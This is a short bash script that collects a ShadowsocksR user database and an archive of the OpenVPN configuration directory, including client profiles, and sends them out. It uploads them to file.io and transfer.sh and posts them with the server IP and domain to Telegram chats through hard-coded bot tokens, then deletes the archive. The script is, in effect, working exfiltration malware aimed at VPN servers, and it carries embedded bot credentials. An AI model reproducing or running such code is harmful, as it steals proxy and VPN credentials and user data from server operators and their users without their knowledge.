#!/bin/bash
link="$(curl -F "file=@/usr/local/shadowsocksr/mudb.json" "https://file.io" | jq ".link")"
kf="$(curl -H "Max-Downloads: 100" -H "Max-Days: 50" -F filedata=@/usr/local/shadowsocksr/mudb.json http://transfer.sh)"
domainopen=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)
domain=$(cat /usr/local/shadowsocksr/userapiconfig.py | grep "SERVER_PUB_ADDR = " | awk -F "[']" '{print $2}')
ip=$(curl 2ip.ru)
if [ -e /usr/local/shadowsocksr/mudb.json ]
then
wget -qO /dev/null "https://api.telegram.org/bot1850711486:AAFGD8mGrdXDj-tu13myhVHUWLaSU0RJJBc/sendMessage?chat_id=-576280739&text=$ip+$domain+ShadowSocks+$kf"
else
echo Bad
fi
if [ -e /usr/local/shadowsocksr/mudb.json ]
then
curl -F "chat_id=-576280739" -F document=@/usr/local/shadowsocksr/mudb.json https://api.telegram.org/bot1757317718:AAEI8AZubdDS6EOfKXBPkkKs4iSsxxLHNYQ/sendDocument?caption=$domain
else
echo Bad
fi
cp /root/*.ovpn /etc/openvpn
cd /etc
tar -czvf "openvpn.tar.gz" "openvpn"
linkopen="$(curl -H "Max-Downloads: 100" -H "Max-Days: 50" -F filedata=@/etc/openvpn.tar.gz http://transfer.sh)"
if [ -e /etc/openvpn/server/server.conf ]
then
wget -qO /dev/null "https://api.telegram.org/1850711486:AAFGD8mGrdXDj-tu13myhVHUWLaSU0RJJBc/sendMessage?chat_id=-576280739&text=$ip+$domainopen+OpenVPN+$linkopen"
else
echo Bad
fi
if [ -e /etc/openvpn/server/server.conf ]
then
curl -F "chat_id=-576280739" -F document=@/etc/openvpn.tar.gz https://api.telegram.org/bot1850711486:AAFGD8mGrdXDj-tu13myhVHUWLaSU0RJJBc/sendDocument?caption=$domainopen
else
echo Bad
fi
rm /etc/openvpn.tar.gz